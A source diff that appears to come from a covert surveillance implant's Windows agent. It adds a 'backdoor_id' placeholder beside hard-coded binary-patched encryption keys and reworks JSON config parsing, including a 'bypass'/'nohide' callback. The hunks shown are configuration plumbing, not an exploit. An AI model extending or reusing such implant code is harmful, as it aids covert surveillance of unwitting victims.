@@ -115,6 +115,8 @@ BYTE bin_patched_key[KEY_LEN] = "ngkdNGKDh4H4883";
 // Qui finira' il binary patch con la chiave di cifratura per la conf
 BYTE bin_patched_key_conf[KEY_LEN] = "ngkdNGKDh4H4869";
 
+BYTE bin_patched_backdoor_id[] = "caccapupu";
+
 // Variabili di configurazione globali
 nanosec_time date_delta; // Usato per eventuali aggiustamenti sulla lettura delle date
 
@@ -2058,11 +2060,12 @@ BYTE *HM_ReadClearConf(char *conf_name)
 }
 
 // Passa alla callback tutti i sotto-oggetti dell'oggetto "section" nella configurazione json
-typedef void (WINAPI *conf_callback_t)(JSONObject);
+typedef void (WINAPI *conf_callback_t)(JSONObject, DWORD counter);
 BOOL HM_ParseConfSection(char *conf, WCHAR *section, conf_callback_t call_back)
 {
 	JSONValue *value;
 	JSONObject root;
+	DWORD counter = 0;
 
 	value = JSON::Parse(conf);
 	if (!value)
@@ -2077,7 +2080,7 @@ BOOL HM_ParseConfSection(char *conf, WCHAR *section, conf_callback_t call_back)
 		JSONArray jarray = root[section]->AsArray();
 		for (unsigned int i = 0; i < jarray.size(); i++) {
 			if (jarray[i]->IsObject()) 
-				call_back(jarray[i]->AsObject());
+				call_back(jarray[i]->AsObject(), counter++);
 		}
 	}
 	delete value;
@@ -2099,13 +2102,39 @@ BOOL HM_ParseConfGlobals(char *conf, conf_callback_t call_back)
 	}
 	root = value->AsObject();
 	obj = root[L"globals"]->AsObject();
-	call_back(obj);
+	call_back(obj, 0);
 
 	delete value;
 	return TRUE;
 }
 
-void WINAPI ParseBypassCallback(JSONObject conf_json)
+BOOL HM_CountConfSection(char *conf, WCHAR *section, DWORD *count)
+{
+	JSONValue *value;
+	JSONObject root;
+
+	*count = 0;
+	value = JSON::Parse(conf);
+	if (!value)
+		return FALSE;
+	if (value->IsObject() == false) {
+		delete value;
+		return FALSE;
+	}
+	root = value->AsObject();
+
+	if (root.find(section) != root.end() && root[section]->IsArray()) {
+		JSONArray jarray = root[section]->AsArray();
+		*count = jarray.size();
+	}
+	delete value;
+	if (*count != 0)
+		return TRUE;
+	return FALSE;
+}
+
+
+void WINAPI ParseBypassCallback(JSONObject conf_json, DWORD dummy)
 {
 	DWORD index;
 	JSONArray bypass_array = conf_json[L"nohide"]->AsArray();
